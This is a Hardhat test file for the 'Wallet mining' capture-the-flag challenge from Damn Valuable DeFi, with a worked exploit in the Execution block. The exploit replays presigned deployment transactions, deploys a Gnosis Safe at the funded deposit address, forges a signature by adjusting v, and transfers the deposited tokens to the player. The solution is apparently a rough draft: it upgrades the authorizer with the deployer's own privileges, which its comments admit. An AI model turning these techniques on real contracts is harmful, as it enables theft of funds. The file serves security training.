const { ethers, upgrades } = require('hardhat');
const { expect, assert } = require('chai');

describe('[Challenge] Wallet mining', function () {
    let deployer, player;
    let token, authorizer, walletDeployer;
    let initialWalletDeployerTokenBalance;

    const DEPOSIT_ADDRESS = '0x9b6fb606a9f5789444c17768c6dfcf2f83563801';
    const DEPOSIT_TOKEN_AMOUNT = 20000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, ward, player] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy authorizer with the corresponding proxy
        authorizer = await upgrades.deployProxy(
            await ethers.getContractFactory('AuthorizerUpgradeable', deployer),
            [[ward.address], [DEPOSIT_ADDRESS]], // initialization data
            { kind: 'uups', initializer: 'init' }
        );

        expect(await authorizer.owner()).to.eq(deployer.address);
        expect(await authorizer.can(ward.address, DEPOSIT_ADDRESS)).to.be.true;
        expect(await authorizer.can(player.address, DEPOSIT_ADDRESS)).to.be.false;

        // Deploy Safe Deployer contract
        walletDeployer = await (await ethers.getContractFactory('WalletDeployer', deployer)).deploy(
            token.address
        );
        expect(await walletDeployer.chief()).to.eq(deployer.address);
        expect(await walletDeployer.gem()).to.eq(token.address);

        // Set Authorizer in Safe Deployer
        await walletDeployer.rule(authorizer.address);
        expect(await walletDeployer.mom()).to.eq(authorizer.address);

        await expect(walletDeployer.can(ward.address, DEPOSIT_ADDRESS)).not.to.be.reverted;
        await expect(walletDeployer.can(player.address, DEPOSIT_ADDRESS)).to.be.reverted;

        // Fund Safe Deployer with tokens
        initialWalletDeployerTokenBalance = (await walletDeployer.pay()).mul(43);
        await token.transfer(
            walletDeployer.address,
            initialWalletDeployerTokenBalance
        );

        // Ensure these accounts start empty
        expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.fact())).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.copy())).to.eq('0x');

        // Deposit large amount of DVT tokens to the deposit address
        await token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Ensure initial balances are set correctly
        expect(await token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
        expect(await token.balanceOf(walletDeployer.address)).eq(
            initialWalletDeployerTokenBalance
        );
        expect(await token.balanceOf(player.address)).eq(0);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        // console.log('implmention', await ethers.provider.getStorageAt(
        //     authorizer.address,
        //     '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc'
        // ));

        // const authorizerImplmention = await (await ethers.getContractFactory('AuthorizerUpgradeable')).attach('0xe7f1725e7734ce288f8367e1bb143e90bb3f0512');
        // await authorizerImplmention.init([player.address], [DEPOSIT_ADDRESS]);

        console.log('mom', await walletDeployer.mom());
        console.log('owner of authorizer', await authorizer.owner());
        const txData = require('./data.json');
        await deployer.sendTransaction({
            to: '0x1aa7451dd11b8cb16ac089ed7fe05efa00100a6a',
            value: ethers.utils.parseEther('1'),
        })
        await deployer.sendTransaction({
            to: DEPOSIT_ADDRESS,
            value: ethers.utils.parseEther('1'),
        })
        await ethers.provider.sendTransaction(txData.nonce0);
        await ethers.provider.sendTransaction(txData.nonce1);
        await ethers.provider.sendTransaction(txData.nonce2);
        const GnosisSafe = await ethers.getContractFactory('GnosisSafe');
        masterCopy = await GnosisSafe.attach('0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F');
        walletFactory = await (await ethers.getContractFactory('GnosisSafeProxyFactory', player)).attach('0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B');

        const wmHelper = await (await ethers.getContractFactory('WalletMiningHelper')).deploy();
        const initData = GnosisSafe.interface.encodeFunctionData('setup', [
            [player.address],
            1,
            '0x0000000000000000000000000000000000000000',
            '0x',
            wmHelper.address,
            '0x0000000000000000000000000000000000000000',
            0,
            '0x0000000000000000000000000000000000000000'
        ]);

        var canCalldata = walletDeployer.interface.encodeFunctionData('bingo', [player.address, DEPOSIT_ADDRESS])
        console.log('bingoCall', canCalldata);
        // canCalldata = canCalldata.replace('3378c00', '3378cFF')
        console.log("bingo", walletDeployer.interface.decodeFunctionResult('bingo', await ethers.provider.call({
            to: walletDeployer.address,
            data: canCalldata
        })));

        // TODO 没找到其他方式去获取 walletDeployer 的 token
        // await expect(walletDeployer.can(player.address, DEPOSIT_ADDRESS)).to.be.reverted;
        // await authorizerImplmention.connect(player).upgradeTo(wmHelper.address);
        // await expect(walletDeployer.can(player.address, DEPOSIT_ADDRESS)).to.be.true;
        await authorizer.upgradeTo(wmHelper.address);
        // await authorizer.connect(player).init([player.address], [DEPOSIT_ADDRESS]);

        var i = 0;
        // || (await token.balanceOf(walletDeployer.address)).gt(0)
        while ((await ethers.provider.getCode(DEPOSIT_ADDRESS)) == '0x') {
            i++;
            const tx = await walletDeployer.connect(player).drop(initData);
            console.log('tx', i, await tx.wait());
        }

        const tokenBalance = await token.balanceOf(DEPOSIT_ADDRESS);
        assert(tokenBalance.eq(DEPOSIT_TOKEN_AMOUNT), 'token balance is not correct');

        // FIXME damn 工程里面带的 GnosisSafe 合约的 getTransactionHash 跟实际的不一样
        const dataHash = await wmHelper.getTransactionHash(token.address,
            0,
            token.interface.encodeFunctionData('transfer', [player.address, tokenBalance]),
            0,
            0,
            0,
            0,
            '0x0000000000000000000000000000000000000000',
            '0x0000000000000000000000000000000000000000',
            0);

        const wallet = await GnosisSafe.attach(DEPOSIT_ADDRESS);
        expect(await wallet.isOwner(player.address), 'player is not owner').to.be.true;

        var sigs = await player.signMessage(ethers.utils.arrayify(dataHash));
        console.log(sigs);
        const sigsSplited = ethers.utils.splitSignature(sigs);
        sigsSplited.v += 4;
        sigs = sigsSplited.r + sigsSplited.s.substring(2) + sigsSplited.v.toString(16);
        console.log(sigs);

        console.log('prefixedHash', ethers.utils.hashMessage(ethers.utils.arrayify(dataHash)));
        console.log('player address', player.address);
        console.log(await wmHelper.connect(player).checkSignature(dataHash, sigs));

        await wallet.execTransaction(
            token.address,
            0,
            token.interface.encodeFunctionData('transfer', [player.address, tokenBalance]),
            0,
            0,
            0,
            0,
            '0x0000000000000000000000000000000000000000',
            '0x0000000000000000000000000000000000000000',
            sigs
        )
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Factory account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.fact())
        ).to.not.eq('0x');

        // Master copy account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.copy())
        ).to.not.eq('0x');

        // Deposit account must have code
        expect(
            await ethers.provider.getCode(DEPOSIT_ADDRESS)
        ).to.not.eq('0x');

        // The deposit address and the Safe Deployer contract must not hold tokens
        expect(
            await token.balanceOf(DEPOSIT_ADDRESS)
        ).to.eq(0);
        expect(
            await token.balanceOf(walletDeployer.address)
        ).to.eq(0);

        // Player must own all tokens
        expect(
            await token.balanceOf(player.address)
        ).to.eq(initialWalletDeployerTokenBalance.add(DEPOSIT_TOKEN_AMOUNT));
    });
});